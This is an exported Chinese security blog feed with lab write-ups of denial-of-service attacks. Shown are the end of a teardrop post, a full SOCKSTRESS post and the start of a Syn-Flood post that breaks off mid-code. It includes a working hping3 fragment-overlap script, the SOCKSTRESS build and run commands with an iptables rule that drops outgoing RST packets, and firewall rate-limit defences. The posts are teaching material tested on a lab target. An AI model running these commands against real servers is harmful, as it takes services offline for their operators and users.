Offset可以控制片偏移量，而正常情况下这是一个很不错的功能，可以帮助我们重组数据包，就如上面截图所示，但是作为一名安全研究者我们就要研究它不正常状态会发生什么情况</h4><h4 id="2-假如正常情况下第一片传输了1480-byte的数据，那么第二片的Fragment-Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误"><a href="#2-假如正常情况下第一片传输了1480-byte的数据，那么第二片的Fragment-Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误" class="headerlink" title="2. 假如正常情况下第一片传输了1480 byte的数据，那么第二片的Fragment Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误"></a>2. 假如正常情况下第一片传输了1480 byte的数据，那么第二片的Fragment Offset在正常情况下肯定为1480，偏移这么多之后再传输数据，这样传输过程并不会发生什么错误</h4><h4 id="3-但是，如果hacker主动修改第二片的Fragment-Offset，让Fragment-Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的"><a href="#3-但是，如果hacker主动修改第二片的Fragment-Offset，让Fragment-Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的" class="headerlink" title="3.但是，如果hacker主动修改第二片的Fragment Offset，让Fragment Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的"></a>3.但是，如果hacker主动修改第二片的Fragment Offset，让Fragment Offset：1380传输过去，那么就会覆盖第一片中的数据，此时这种结果对于上个世纪的机器来说是非预期情况，就会出现蓝屏死机等现象，就达到了攻击的预期目的</h4><h4 id="4-然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了"><a href="#4-然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了" class="headerlink" title="4.然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了"></a>4.然而，对于现代操作系统来说一旦出现这种情况则会直接覆盖数据或者丢弃数据包来应付，所以此种攻击几乎无效了</h4><blockquote>
<p>[*]下面是笔者修改后的shell脚本，主要就是利用hping3来发送修改Fragment Offset后的包到目标机器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$#</span> -eq 1</div><div class="line"><span class="keyword">then</span></div><div class="line">	<span class="keyword">for</span>((i=100;i&lt;150;i++))</div><div class="line">		<span class="keyword">do</span></div><div class="line">			hping3 <span class="variable">$1</span> -1 -x -d 1000 -N <span class="variable">$i</span> -c 1</div><div class="line">			hping3 <span class="variable">$1</span> -1 -d 200 -g 400 -N <span class="variable">$i</span> -c 1</div><div class="line">		<span class="keyword">done</span></div><div class="line"><span class="keyword">else</span></div><div class="line">	<span class="built_in">echo</span> <span class="string">"[*]YOU SHOULD DO LIKE THIS: ./teardrop [target_IP]"</span></div><div class="line">	<span class="built_in">echo</span> <span class="string">"[*]please enter again!!"</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure></p>
</blockquote>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。"><a href="#emsp-emsp-学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。" class="headerlink" title="&emsp;&emsp;学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。"></a>&emsp;&emsp;学了又忘，忘了又学。不如直接写下来，既方便查找，又分享知识。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SOCKSTRESS]]></title>
      <url>/2017/09/23/SOCKSTRESS/</url>
      <content type="html"><![CDATA[<h2 id="0x00-SOCKSTRESS攻击简介"><a href="#0x00-SOCKSTRESS攻击简介" class="headerlink" title="0x00. SOCKSTRESS攻击简介"></a>0x00. SOCKSTRESS攻击简介</h2><h4 id="emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。"><a href="#emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。" class="headerlink" title="&emsp;&emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。"></a>&emsp;&emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。</h4><a id="more"></a>
<hr>
<h2 id="0x01-SOCKSTRESS攻击原理"><a href="#0x01-SOCKSTRESS攻击原理" class="headerlink" title="0x01. SOCKSTRESS攻击原理"></a>0x01. SOCKSTRESS攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/WEBRESOURCE8d0ba39bc433eeb905b6ad6db08ee003/1559" alt="image"></p>
<h3 id="上篇文章已经给大家介绍过TCP-IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理"><a href="#上篇文章已经给大家介绍过TCP-IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理" class="headerlink" title="上篇文章已经给大家介绍过TCP/IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理"></a>上篇文章已经给大家介绍过TCP/IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理</h3><h4 id="emsp-emsp-1-首先，攻击者大量请求建立三次握手连接"><a href="#emsp-emsp-1-首先，攻击者大量请求建立三次握手连接" class="headerlink" title="&emsp;&emsp;1.首先，攻击者大量请求建立三次握手连接"></a>&emsp;&emsp;1.首先，攻击者大量请求建立三次握手连接</h4><h4 id="emsp-emsp-2-成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源"><a href="#emsp-emsp-2-成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源" class="headerlink" title="&emsp;&emsp;2.成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源"></a>&emsp;&emsp;2.成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源</h4><h4 id="emsp-emsp-3-当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网"><a href="#emsp-emsp-3-当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网" class="headerlink" title="&emsp;&emsp;3.当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网"></a>&emsp;&emsp;3.当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网</h4><h3 id="下面是attacker发向server的一个ACK包，window被置为了0"><a href="#下面是attacker发向server的一个ACK包，window被置为了0" class="headerlink" title="[*]下面是attacker发向server的一个ACK包，window被置为了0"></a>[*]下面是attacker发向server的一个ACK包，window被置为了0</h3><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/3AA80062D00C4DB7BC40609FB312723E/1691" alt="image"></p>
<hr>
<h2 id="0x02-SOCKSTRESS攻击实战"><a href="#0x02-SOCKSTRESS攻击实战" class="headerlink" title="0x02. SOCKSTRESS攻击实战"></a>0x02. SOCKSTRESS攻击实战</h2><h4 id="emsp-emsp-这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。"><a href="#emsp-emsp-这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。" class="headerlink" title="&emsp;&emsp;这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。"></a>&emsp;&emsp;这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-SOCKSTRESS攻击脚本"><a href="#emsp-emsp-1-SOCKSTRESS攻击脚本" class="headerlink" title="&emsp;&emsp;1. SOCKSTRESS攻击脚本"></a>&emsp;&emsp;1. SOCKSTRESS攻击脚本</h4><h4 id="emsp-emsp-2-kali-linux"><a href="#emsp-emsp-2-kali-linux" class="headerlink" title="&emsp;&emsp;2. kali linux"></a>&emsp;&emsp;2. kali linux</h4><h4 id="emsp-emsp-3-metasploit靶机-IP-192-168-1-104"><a href="#emsp-emsp-3-metasploit靶机-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;3. metasploit靶机 IP=192.168.1.104"></a>&emsp;&emsp;3. metasploit靶机 IP=192.168.1.104</h4><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h4 id="1-下载Github上面的SOCKSTRESS攻击脚本并安装"><a href="#1-下载Github上面的SOCKSTRESS攻击脚本并安装" class="headerlink" title="1.下载Github上面的SOCKSTRESS攻击脚本并安装"></a>1.下载Github上面的SOCKSTRESS攻击脚本并安装</h4><blockquote>
<p>git clone <a href="https://github.com/defuse/sockstress" target="_blank" rel="external">https://github.com/defuse/sockstress</a> &amp;&amp; cd sockstress/ &amp;&amp; make</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/BEC0232B6B914CE38A3331BCCBE51018/1612" alt="image"></p>
<h4 id="2-设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）"><a href="#2-设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）" class="headerlink" title="2.设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）"></a>2.设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）</h4><blockquote>
<p>iptables -A OUTPUT -p TCP <strong>-</strong>-tcp-flags rst rst -d xx.xx.xx.xx -j DROP</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/406BA39543DB482FB7FBBEAF43381AE2/1627" alt="image"></p>
<h4 id="3-运行SOCKSTRESS攻击脚本，攻击靶机的80端口"><a href="#3-运行SOCKSTRESS攻击脚本，攻击靶机的80端口" class="headerlink" title="3.运行SOCKSTRESS攻击脚本，攻击靶机的80端口"></a>3.运行SOCKSTRESS攻击脚本，攻击靶机的80端口</h4><blockquote>
<p>./sockstress xx.xx.xx.xx:80 eth0 -p payloads/http -d 100</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/A6C4BCBC67454DCBB7C54DAD971815D8/1635" alt="image"></p>
<h4 id="4-查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机"><a href="#4-查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机" class="headerlink" title="4.查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机"></a>4.查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机</h4><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/8E823BF4397E4832A5CD0610084DCFE8/1637" alt="image"></p>
<hr>
<h2 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03. 防御措施"></a>0x03. 防御措施</h2><h3 id="emsp-emsp-对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了"><a href="#emsp-emsp-对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了" class="headerlink" title="&emsp;&emsp;对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了"></a>&emsp;&emsp;对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了</h3><blockquote>
<p>iptables -I INPUT -p tcp <strong>-</strong>-dport 80 -m state <strong>-</strong>-state NEW -m recent <strong>-</strong>-set &amp;&amp; iptables -I INPUT -p tcp <strong>-</strong>-dport 80 -m state <strong>-</strong>-state NEW -m recent  <strong>-</strong>-update <strong>-</strong>-seconds 30 <strong>-</strong>-hitcount 10 -j DROP</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/4EF59A94649B42AA8AF65632AEFC9EBC/1664" alt="image"></p>
<h4 id="可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。"><a href="#可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。" class="headerlink" title="可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。"></a>可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。</h4><hr>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending-a-problem-doesn’t-exist-won’t-make-it-go-away"><a href="#emsp-emsp-不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending-a-problem-doesn’t-exist-won’t-make-it-go-away" class="headerlink" title="&emsp;&emsp;不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending a problem doesn’t exist won’t make it go away."></a>&emsp;&emsp;不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending a problem doesn’t exist won’t make it go away.</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Syn-Flood]]></title>
      <url>/2017/09/21/Syn-Flood/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Syn-Flood攻击简介"><a href="#0x00-Syn-Flood攻击简介" class="headerlink" title="0x00. Syn-Flood攻击简介"></a>0x00. Syn-Flood攻击简介</h2><h4 id="emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"><a href="#emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。" class="headerlink" title="&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"></a>&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。</h4><a id="more"></a>
<hr>
<h2 id="0x01-TCP-IP三次握手"><a href="#0x01-TCP-IP三次握手" class="headerlink" title="0x01. TCP/IP三次握手"></a>0x01. TCP/IP三次握手</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/WEBRESOURCE82141cc79b8be8e533232aadf09ffc3b/1390" alt="image"></p>
<h4 id="1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。"><a href="#1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。" class="headerlink" title="1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。"></a>1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</h4><h4 id="2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。"><a href="#2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。" class="headerlink" title="2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。"></a>2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。</h4><h4 id="3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"><a href="#3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。" class="headerlink" title="3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"></a>3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</h4><h4 id="下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。"><a href="#下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。" class="headerlink" title="[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。"></a>[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5AA8915F1F464491970B2512AD2C1325/1394" alt="image"></p>
<hr>
<h2 id="0x02-Syn-Flood攻击原理"><a href="#0x02-Syn-Flood攻击原理" class="headerlink" title="0x02. Syn-Flood攻击原理"></a>0x02. Syn-Flood攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/38040545EAD640A5B8D161A4EDB2E087/1407" alt="image"></p>
<h3 id="上图简要介绍了Syn-Flood攻击过程"><a href="#上图简要介绍了Syn-Flood攻击过程" class="headerlink" title="上图简要介绍了Syn-Flood攻击过程"></a>上图简要介绍了Syn-Flood攻击过程</h3><h4 id="1-攻击者先向目标机发送SYN包，请求建立TCP连接"><a href="#1-攻击者先向目标机发送SYN包，请求建立TCP连接" class="headerlink" title="1.攻击者先向目标机发送SYN包，请求建立TCP连接"></a>1.攻击者先向目标机发送SYN包，请求建立TCP连接</h4><h4 id="2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包"><a href="#2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包" class="headerlink" title="2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包"></a>2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包</h4><h4 id="3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"><a href="#3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了" class="headerlink" title="3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"></a>3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了</h4><h4 id="4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦"><a href="#4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦" class="headerlink" title="4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)"></a>4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)</h4><hr>
<h2 id="0x03-Syn-Flood攻击实战"><a href="#0x03-Syn-Flood攻击实战" class="headerlink" title="0x03. Syn-Flood攻击实战"></a>0x03. Syn-Flood攻击实战</h2><h4 id="emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"><a href="#emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。" class="headerlink" title="&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"></a>&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-Syn-Flood脚本"><a href="#emsp-emsp-1-Syn-Flood脚本" class="headerlink" title="&emsp;&emsp;1.Syn-Flood脚本"></a>&emsp;&emsp;1.Syn-Flood脚本</h4><h4 id="emsp-emsp-2-Wireshark抓包工具"><a href="#emsp-emsp-2-Wireshark抓包工具" class="headerlink" title="&emsp;&emsp;2.Wireshark抓包工具"></a>&emsp;&emsp;2.Wireshark抓包工具</h4><h4 id="emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109"><a href="#emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109" class="headerlink" title="&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109"></a>&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109</h4><h4 id="Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）："><a href="#Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）：" class="headerlink" title="Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）："></a>Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div 